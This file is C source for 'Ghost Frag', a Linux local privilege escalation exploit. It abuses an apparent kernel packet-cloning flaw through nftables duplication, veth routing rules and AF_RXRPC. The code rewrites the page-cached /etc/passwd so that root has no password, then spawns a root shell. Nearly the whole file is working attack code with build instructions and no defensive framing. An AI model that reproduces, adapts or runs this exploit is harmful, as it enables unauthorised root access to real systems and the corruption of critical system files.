//
// ghost_frag-nfdup-cap.c - Ghost Frag: nfdup + CAP_NET_ADMIN (no namespaces)
//
// Same exploit without user namespaces. Uses ip rule to force packets
// through veth instead of loopback.
//
// Requires: CAP_NET_ADMIN, CONFIG_IP_MULTIPLE_TABLES, CONFIG_NF_TABLES,
//           CONFIG_NFT_DUP_IPV4, CONFIG_AF_RXRPC, nft(8)
// Build:    gcc -O2 -o ghost_frag-nfdup-cap ghost_frag-nfdup-cap.c
//


#include "ghost_frag_common.h"
#include <sys/prctl.h>

#ifndef PR_CAP_AMBIENT
#define PR_CAP_AMBIENT 47
#define PR_CAP_AMBIENT_RAISE 2
#endif

static int has_cap(unsigned cap)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    char line[256]; unsigned long long val;
    while (fgets(line, sizeof(line), f))
        if (sscanf(line, "CapEff: %llx", &val) == 1)
            { fclose(f); return (val >> cap) & 1; }
    fclose(f);
    return 0;
}

static void make_caps_ambient(void)
{
    // Raise CAP_NET_ADMIN in inheritable + ambient sets so
    // child processes spawned by system() inherit it.
    struct { unsigned int version; int pid; } h = { 0x20080522, 0 };
    struct { unsigned int effective, permitted, inheritable; } d[2] = {{0},{0}};
    syscall(SYS_capget, &h, d);
    d[0].inheritable |= (1u << 12);
    syscall(SYS_capset, &h, d);
    prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 12, 0, 0);
}

static const char *g_nft;

static int setup_network(void)
{
    run_cmd("ip link add veth0 type veth peer name veth1");
    run_cmd("ip addr add 10.0.0.1/24 dev veth0");
    run_cmd("ip addr add 10.0.0.2/24 dev veth1");
    run_cmd("ip link set veth0 up; ip link set veth1 up");

    run_cmd("ip rule del priority 0 lookup local 2>/dev/null");
    run_cmd("ip rule add priority 200 lookup local");
    run_cmd("ip rule add priority 100 from 10.0.0.2 iif lo lookup 100");
    run_cmd("ip route add 10.0.0.1 dev veth1 table 100");
    run_cmd("ip rule add priority 101 from 10.0.0.1 iif lo lookup 101");
    run_cmd("ip route add 10.0.0.2 dev veth0 table 101");

    run_cmd("%s add table ip gf", g_nft);
    run_cmd("%s add chain ip gf output '{ type filter hook output priority 0; }'", g_nft);
    run_cmd("%s add rule ip gf output ip daddr 10.0.0.1 dup to 10.0.0.1 device \"veth1\"", g_nft);
    sleep(1);
    return 0;
}

static void cleanup_network(void)
{
    run_cmd("%s delete table ip gf 2>/dev/null", g_nft);
    run_cmd("ip rule del priority 100 2>/dev/null"); run_cmd("ip rule del priority 101 2>/dev/null");
    run_cmd("ip route del 10.0.0.1 table 100 2>/dev/null"); run_cmd("ip route del 10.0.0.2 table 101 2>/dev/null");
    run_cmd("ip rule del priority 200 lookup local 2>/dev/null");
    run_cmd("ip rule add priority 0 lookup local 2>/dev/null");
    run_cmd("ip link del veth0 2>/dev/null");
}

static int do_trigger(int file_fd, const uint8_t key[8],
                      uint16_t port_S, uint16_t svc_id,
                      off_t splice_off, int tid)
{
    int ipc[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, ipc);
    pid_t child = fork();
    if (child == 0) {
        close(ipc[0]);
        child_do_trigger(ipc[1], file_fd);
        close(ipc[1]); _exit(0);
    }
    close(ipc[1]);
    parent_do_trigger(ipc[0], key, port_S, svc_id, splice_off, 8, tid);
    close(ipc[0]);
    int st; waitpid(child, &st, 0);
    return 0;
}

int main(void)
{
    if (getuid() == 0) { execlp("/bin/bash", "bash", (char *)NULL); return 0; }
    fprintf(stderr,
        "\n  Ghost Frag - nfdup + CAP_NET_ADMIN (no namespaces)\n"
        "  __pskb_copy_fclone flag loss LPE\n\n");
    LOG("uid=%u euid=%u", getuid(), geteuid());

    if (!has_cap(12)) { ERR("CAP_NET_ADMIN not available"); return 1; }
    LOG("CAP_NET_ADMIN: ok");
    make_caps_ambient();

    g_nft = NULL;
    const char *np[] = { "/usr/sbin/nft", "/sbin/nft", "/usr/bin/nft", "nft", NULL };
    for (int i = 0; np[i]; i++) {
        char c[256]; snprintf(c, sizeof(c), "%s --version >/dev/null 2>&1", np[i]);
        if (system(c) == 0) { g_nft = np[i]; break; }
    }
    if (!g_nft) { ERR("nft not found"); return 1; }
    int d = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (d < 0) { ERR("AF_RXRPC unavailable"); return 1; } close(d);

    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { ERR("open: %s", strerror(errno)); return 1; }
    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { ERR("mmap: %s", strerror(errno)); return 1; }

    const char *p = (const char *)map;
    g_saved_len = 0;
    while (g_saved_len < (int)sizeof(g_saved_line) - 1 && p[g_saved_len] != '\n')
        g_saved_len++;
    memcpy(g_saved_line, p, g_saved_len);
    g_saved_line[g_saved_len] = '\n'; g_saved_len++;
    save_backup();

    if (memcmp(map, "root::0:0", 9) == 0) goto do_su;
    setup_network();

    uint8_t Ca[8], Cb[8], Cc[8];
    pread(fd, Ca, 8, 4); pread(fd, Cb, 8, 6); pread(fd, Cc, 8, 8);
    fcrypt_init_sboxes();
    uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
    uint8_t Ka[8], Pa[8], Kb[8], Pb[8], Kc[8], Pc[8];

    LOG("brute-force K_A");
    if (find_key(Ca, check_colons, Ka, Pa, seed, "K_A") < 0) goto fail;
    uint8_t Cb_a[8]; memcpy(Cb_a, Pa+2, 6); memcpy(Cb_a+6, Cb+6, 2);
    LOG("brute-force K_B");
    if (find_key(Cb_a, check_zero_colon, Kb, Pb, seed^0xa5a5a5a5a5a5a5a5ULL, "K_B") < 0) goto fail;
    uint8_t Cc_a[8]; memcpy(Cc_a, Pb+2, 6); memcpy(Cc_a+6, Cc+6, 2);
    LOG("brute-force K_C");
    if (find_key(Cc_a, check_gecos, Kc, Pc, seed^0x5a5a5a5a5a5a5a5aULL, "K_C") < 0) goto fail;

    LOG("trigger A"); do_trigger(fd, Ka, 7000, 1234, 4, 0);
    LOG("trigger B"); do_trigger(fd, Kb, 7010, 1235, 6, 1);
    LOG("trigger C"); do_trigger(fd, Kc, 7020, 1236, 8, 2);

    if (p[4] != ':' || p[5] != ':') {
        ERR("verify failed");
        fprintf(stderr, "[*] after: \"");
        for (int i = 0; i < 32 && p[i] != '\n'; i++)
            fputc(p[i] >= 32 && p[i] < 127 ? p[i] : '.', stderr);
        fprintf(stderr, "\"\n");
        goto fail;
    }
    LOG("/etc/passwd corrupted: root::0:0");
    cleanup_network();

do_su: close(fd); LOG("spawning root shell ..."); run_su_pty(); return 0;
fail:  cleanup_network(); return 1;
}
